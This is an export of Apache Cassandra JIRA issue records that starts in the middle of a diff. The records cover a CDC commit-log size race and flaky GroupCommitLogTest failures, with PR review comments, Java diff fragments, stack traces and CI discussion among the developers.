                 segment.setCDCState(blocking && segmentSize + sizeInProgress.get() > allowance
                                     ? CDCState.FORBIDDEN
                                     : CDCState.PERMITTED);
 
-                // Remove the oldest cdc segment file when exceeding the CDC storage allowance
-                while (!blocking && segmentSize + sizeInProgress.get() > allowance)
-                {
-                    long releasedSize = segmentManager.deleteOldestLinkedCDCCommitLogSegment();
-                    sizeInProgress.getAndAdd(-releasedSize);
-                    logger.debug(""Freed up {} bytes after deleting the oldest CDC commit log segment in non-blocking mode. "" +
-                                 ""Total on-disk CDC size: {}; allowed CDC size: {}"",
-                                 releasedSize, sizeInProgress.get() + segmentSize, allowance);
-                }
-
                 // Aggresively count in the (estimated) size of new segments.
                 if (segment.getCDCState() == CDCState.PERMITTED)
-                    sizeInProgress.getAndAdd(segmentSize);
+                    addSize(segmentSize);
+            }
+
+            // Remove the oldest cdc segment file when exceeding the CDC storage allowance
+            if (!blocking && sizeInProgress.get() > allowance)
+            {
+                long bytesToFree = sizeInProgress.get() - allowance;
+                long remaningSize = segmentManager.deleteOldLinkedCDCCommitLogSegment(bytesToFree);
+                long releasedSize = sizeInProgress.get() - remaningSize;
+                sizeInProgress.getAndSet(remaningSize);
+                logger.debug(""Freed up {} ({}) bytes after deleting the oldest CDC commit log segments in non-blocking mode. "" +
+                             ""Total on-disk CDC size: {}; allowed CDC size: {}"",

Review comment:
       The value of the `remainingSize` is used in the log message. `sizeInProgress` is updated with `remainingSize` just before logging. I am OK to use `remainingSize` instead. 
   It is a debug message. I was using `bytesToFree` and `releasedSize` to inspect what is the size it expects to reclaim and what is the size it actually reclaimed. 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Jan/22 05:47;githubbot;600","yifan-c commented on pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#issuecomment-1015091316


   > Also needs CHANGES.txt and commit msg revised for commit.
   > 
   > Looking good though!
   
   Thanks for the review! I will add the entry to `CHANGES.txt` on committing. 


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Jan/22 05:50;githubbot;600","yifan-c commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r789053486



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -84,21 +84,46 @@ public void discard(CommitLogSegment segment, boolean delete)
 
     /**
      * Delete the oldest hard-linked CDC commit log segment to free up space.
+     * @param bytesToFree, the minimum space to free up
      * @return total deleted file size in bytes

Review comment:
       I forgot to address this one. I will update the doc soon




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;20/Jan/22 18:41;githubbot;600","josh-mckenzie commented on a change in pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379#discussion_r804961045



##########
File path: src/java/org/apache/cassandra/db/commitlog/CommitLogSegmentManagerCDC.java
##########
@@ -380,14 +430,12 @@ private void addSize(long toAdd)
     @VisibleForTesting
     public long updateCDCTotalSize()
     {
+        long sleepTime = DatabaseDescriptor.getCDCDiskCheckInterval() + 10L;

Review comment:
       Discussed offline; up this to 50 and hold our noses and it should have enough buffer for really overloaded test environments, since it's ultimately a directory walk + atomic update.




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;11/Feb/22 19:51;githubbot;600","smiklosovic closed pull request #1379:
URL: https://github.com/apache/cassandra/pull/1379


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;16/Mar/22 08:54;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,5400,,,0,5400,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,yifanc,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Feb 17 06:57:35 UTC 2022,,,,,,,All,,,,"0|z0y7l4:",9223372036854775807,,,,jmckenzie,,,,Normal,,5.0,,https://github.com/apache/cassandra/commit/8327744c1aca0d9471cd8a01a1c7d79365363816,,,,,,,,,"CI; Unit tests",,,,,"04/Jan/22 15:28;jmckenzie;ping [~yifanc] as assignee and me as reviewer; think we broke this in CASSANDRA-17002;;;","09/Jan/22 00:01;yifanc;PR: https://github.com/apache/cassandra/pull/1379
CI: https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=CASSANDRA-17233%2Ftrunk&filter=all

The test failure was caused by improper cdc commit log deletion and race on updating the size. (The change was made in CASSANDRA-17001.) 
I updated the implementation of deleting the old linked CDC commit log segments to properly delete the files and update the current total size as part of the deletion since it lists the files already. 

;;;","24/Jan/22 20:30;jmckenzie;+1;;;","24/Jan/22 21:26;yifanc;Starting commit

CI Results (pending):
||Branch||Source||Circle CI||
|trunk|[branch|https://github.com/yifan-c/cassandra/tree/commit_remote_branch/CASSANDRA-17233-trunk-7C1C48C8-465B-44FF-8F99-83034060A7C8]|[build|https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17233-trunk-7C1C48C8-465B-44FF-8F99-83034060A7C8]|;;;","16/Feb/22 15:27;e.dimitrova;Is this ready to commit? Should we change the ticket status if it is not? ;;;","16/Feb/22 19:23;yifanc;[~e.dimitrova], thanks for checking. The patch is ready to commit. Before that, I need to trigger a run in Jenkins to verify there is no more failures. Looks like it is so from the [cdc test suite|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1421/testReport/], so we are good. I was waiting for the build to start. On the day that I scheduled the build, it was not started and continued as not started in the second day, and I did not check afterwards until your reminder :D
I am going to commit it today. ;;;","16/Feb/22 19:43;e.dimitrova;Thanks[~yifanc]  and no worries, I am just a Build Lead this week so that’s how I noticed it. With all fires lately, it is easy to forget 😁;;;","17/Feb/22 06:55;yifanc;Rebased and triggered a new CI: [https://app.circleci.com/pipelines/github/yifan-c/cassandra?branch=commit_remote_branch%2FCASSANDRA-17233-trunk-C7985A39-6B09-4738-B917-828EE4255826&filter=all]

Forgot to update the dtest repo branch in the config, so bunch of dtest fail. The other test pipelines are green. The [jenkins run|https://ci-cassandra.apache.org/job/Cassandra-devbranch/1421/testReport/] has just a few dtest failures. ;;;","17/Feb/22 06:57;yifanc;Committed into trunk as [8327744c|https://github.com/apache/cassandra/commit/8327744c1aca0d9471cd8a01a1c7d79365363816];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
org.apache.cassandra.db.commitlog.GroupCommitLogTest tests failing on trunk,CASSANDRA-17232,13420472,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,bereng,e.dimitrova,e.dimitrova,03/Jan/22 21:54,07/Mar/23 10:38,13/Jul/23 08:40,14/Jul/22 05:03,4.1-beta1,5.0,,,,,CI,,,,0,,"I saw [here|https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1344/testReport/junit/org.apache.cassandra.db.commitlog/GroupCommitLogTest/replayWithDiscard_3_/] and [here|https://ci-cassandra.apache.org/job/Cassandra-trunk/881/testReport/junit/org.apache.cassandra.db.commitlog/GroupCommitLogTest/replayWithDiscard_3__compression_3/] the same assertion failure:

 
{code:java}
org.apache.cassandra.db.commitlog.GroupCommitLogTest.replayWithDiscard[3]

Error Message
expected:<204> but was:<0>

Stacktrace
junit.framework.AssertionFailedError: expected:<204> but was:<0> at org.apache.cassandra.db.commitlog.CommitLogTest.replayWithDiscard(CommitLogTest.java:883)
{code}
 

Then I find that there are many other tests from GroupCommitLogTest failing with No such file found.

Example:

https://jenkins-cm4.apache.org/job/Cassandra-devbranch/1344/",,adelapena,bereng,e.dimitrova,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17705,CASSANDRA-17469,CASSANDRA-17607,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,bereng,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Unit Test,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Jul 14 09:45:48 UTC 2022,,,,,,,All,,,,"0|z0y7kw:",9223372036854775807,,,,adelapena,,,,Normal,,4.1-alpha1,,https://github.com/apache/cassandra/commit/ada958eaf7bd37c38cda55ef469c87f1e7e958bb,,,,,,,,,See PR,,,,,"24/May/22 08:36;bereng;KS isolation seemed to be the cure. Submitted the 4.0 PR and if we're happy with the approach I'll submit the rest.;;;","25/May/22 11:35;adelapena;I think 4.0 is not affected for this bug, nor for the ones reported on CASSANDRA-17469. In fact, 4.0 without the patch survives 1000 iterations without hitting those failures ([j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1604/workflows/ee963ae1-9517-497a-9e8c-82ebf52dab67] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1604/workflows/de382ce3-d0cb-4fcf-afba-ef3fb5d108a3]).

However, if we apply the patch to 4.1 it still hits failures ([j8|https://app.circleci.com/pipelines/github/adelapena/cassandra/1603/workflows/9410e5e6-7328-4da7-b23b-85138f19c39d] [j11|https://app.circleci.com/pipelines/github/adelapena/cassandra/1603/workflows/b9ea90a8-42c0-4012-8338-ca76b88ec40a]). 

Note that the flakiness indicated by CASSANDRA-17469 is quite low and the default 100 iterations are not enough to hit the failures.;;;","26/May/22 08:05;bereng;Gosh you're right. I mixed versions here while repro'ing / fixing. Apologies.;;;","27/May/22 09:19;bereng;Take2: Both {{shutdown}} and {{closeAndDeleteSegmentUnsafe}} paths could be trying to delete at the same time given the right timing and timeouts. Now it survives 1K runs in CI.

I haven't been able to repro anymore the original {{expected:<204> but was:<0>}} which might be fixed by now.

{noformat}
java.io.UncheckedIOException
	at org.apache.cassandra.io.util.PathUtils.propagateUnchecked(PathUtils.java:768)
	at org.apache.cassandra.io.util.PathUtils.propagateUnchecked(PathUtils.java:753)
	at org.apache.cassandra.io.util.PathUtils.delete(PathUtils.java:255)
	at org.apache.cassandra.io.util.PathUtils.delete(PathUtils.java:297)
	at org.apache.cassandra.io.util.PathUtils.delete(PathUtils.java:304)
	at org.apache.cassandra.io.util.File.delete(File.java:158)
	at org.apache.cassandra.io.util.File.delete(File.java:167)
	at org.apache.cassandra.db.commitlog.CommitLogSegmentManagerCDC.discard(CommitLogSegmentManagerCDC.java:75)
	at org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager.closeAndDeleteSegmentUnsafe(AbstractCommitLogSegmentManager.java:479)
	at org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager.stopUnsafe(AbstractCommitLogSegmentManager.java:452)
	at org.apache.cassandra.db.commitlog.CommitLog.stopUnsafe(CommitLog.java:504)
	at org.apache.cassandra.db.commitlog.CommitLog.resetUnsafe(CommitLog.java:470)
	at org.apache.cassandra.db.commitlog.CommitLogTest.beforeTest(CommitLogTest.java:184)
{noformat}

{noformat}
java.io.UncheckedIOException
	at org.apache.cassandra.io.util.PathUtils.propagateUnchecked(PathUtils.java:768)
	at org.apache.cassandra.io.util.PathUtils.propagateUnchecked(PathUtils.java:753)
	at org.apache.cassandra.io.util.PathUtils.delete(PathUtils.java:255)
	at org.apache.cassandra.io.util.PathUtils.delete(PathUtils.java:297)
	at org.apache.cassandra.io.util.PathUtils.delete(PathUtils.java:304)
	at org.apache.cassandra.io.util.File.delete(File.java:158)
	at org.apache.cassandra.io.util.File.delete(File.java:167)
	at org.apache.cassandra.io.util.FileUtils.deleteWithConfirm(FileUtils.java:691)
	at org.apache.cassandra.db.commitlog.CommitLogSegment.discard(CommitLogSegment.java:449)
	at org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager.discardAvailableSegment(AbstractCommitLogSegmentManager.java:523)
	at org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager.shutdown(AbstractCommitLogSegmentManager.java:510)
	at org.apache.cassandra.db.commitlog.AbstractCommitLogSegmentManager.stopUnsafe(AbstractCommitLogSegmentManager.java:453)
	at org.apache.cassandra.db.commitlog.CommitLog.stopUnsafe(CommitLog.java:503)
	at org.apache.cassandra.db.commitlog.CommitLog.resetUnsafe(CommitLog.java:469)
	at org.apache.cassandra.db.commitlog.CommitLogTest.beforeTest(CommitLogTest.java:190)
{noformat}

;;;","09/Jun/22 08:14;bereng;Note to self: we have 3 timeouts in circle atm which make sense as the patch will now be waiting for conditions to be met. If that translates into timeouts in jenkins we could always split the test in the future.;;;","01/Jul/22 16:08;adelapena;I've rebased the patch and [run CI again|https://app.circleci.com/pipelines/github/adelapena/cassandra/1830/workflows/36bb7b87-ea27-43ca-906d-ef15c5ddc6bb]. It seems that the repeated runs still hit multiple timeouts. We could either split them here or separately, hoping that we are not missing something and the timeouts aren't due to a deadlock.

As for [retrying the calls to {{awaitTermination}} in a loop|https://github.com/apache/cassandra/pull/1651/commits/541300b10724d4547af6b89196fad2c0eab69ff0], maybe we can just add timeout parameters to that method and call it a single time with a longer timeout, more or less [this way|https://github.com/adelapena/cassandra/commit/caeca078d38ef0fe39c1db19a23aba67095bc83c].

Regarding [catching and ignoring any {{UncheckedIOException}}|https://github.com/apache/cassandra/pull/1651/commits/ffccbfcb779831a87b39bc6528e61fd15ef18228], I understand that those are raised when the call to {{awaitTermination}} hasn't finished properly. Maybe we can use the boolean returned by {{executor.awaitTermination}} to throw an assertion error if it hasn't finished within the timeline, so we don't continue to the segment deletion if we haven't properly stopped the executor. wdyt?;;;","01/Jul/22 17:24;adelapena;{quote}We could either split them here or separately, hoping that we are not missing something and the timeouts aren't due to a deadlock.
{quote}
I have run the patch with [a temporarily increased {{test.timeout}}|https://github.com/adelapena/cassandra/commit/b9de8456f8cdc15c6f4873be6b923d0c3a46a04a] to see if the timeouts were masking something that could resurface when splitting the test to avoid such timeouts. [The run|https://app.circleci.com/pipelines/github/adelapena/cassandra/1833/workflows/c1503aac-33aa-472b-9d82-cc9ce08ebcd4] doesn't hit timeouts anymore, as it was expected. However, it hits some of the original assertion errors and {{{}UncheckedIOException{}}}. So it seems that we are still missing something here.;;;","04/Jul/22 09:08;bereng;I am going to do [1 run|https://app.circleci.com/pipelines/github/bereng/cassandra/695/workflows/7170244e-3d61-43de-ad62-2c8c840cc976] failing if {{awaitTermination}} doesn't succeed so we can know if these 2 diff errors are related or not.;;;","04/Jul/22 09:47;bereng;Ok so all failures now are on the commit log not having stopped so we can see we were dealing with side effects and a common root. Let me dig a bit more why it won't stop even in 5 minutes...;;;","06/Jul/22 09:31;bereng;So we were swallowing interrupts [here|https://github.com/apache/cassandra/pull/1651/files#diff-536585042adf6b16fdd0a2d894080cb7c3a7f0ab7f67e2d9dd8dbf09110b74daR159], which has a wait at the end, hence blocking and timing out when waiting on the executor to finish.

I got past that but now I hit again file inconsistencies and the original error. So some progress made but this is still quite convoluted.;;;","07/Jul/22 08:11;bereng;[~adelapena] found it. We were swallowing interrupts and not properly cleaning up on them. CI attached in the PR green as a 4 leaved clover as you say lol :-);;;","12/Jul/22 15:34;adelapena;Great, nice catch! Looks good to me, +1.;;;","13/Jul/22 07:20;bereng;All rebased, trunk PR added and CI re-run [~adelapena]. If it lgty I think we are ready to merge;;;","13/Jul/22 11:21;adelapena;The PR for trunk looks good. As for the CI failures:

* {{test_multiple_repair}} seems CASSANDRA-17005
* {{test_change_durable_writes}} seems one of the Jolokia issues, CASSANDRA-17732.
* {{test_speculative_data_request}} seems new. If it doesn't have a known cause we should probably run it on trunk with the multiplexer to verify that we are not introducing new failures.

We should also probably run {{GroupCommitLogTest}} on the multiplexer for the trunk PR, just in case.;;;","13/Jul/22 13:08;bereng;I started a new trunk [1K runs|https://app.circleci.com/pipelines/github/bereng/cassandra/716/workflows/fd1e9d34-c193-47c8-9486-84bb6218d79f/jobs/6435] for this ticket and they pass.

As to test_speculative_data_request is has failed before and was supposedly fixed by CASSANDRA-17119. I don't think it's related and passes locally and [multiplexed|https://app.circleci.com/pipelines/github/bereng/cassandra/717/workflows/284d34c1-acda-4157-b909-69f6c46caa60/jobs/6437] so maybe an env issue? :shrug:;;;","13/Jul/22 15:33;adelapena;Great, thanks. I haven't been able to reproduce the error on {{{}test_speculative_data_request{}}}, so I guess we can consider it an env issue. I think we can commit this and keep an eye on that test.;;;","14/Jul/22 09:45;bereng;Thanks a lot for the review!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
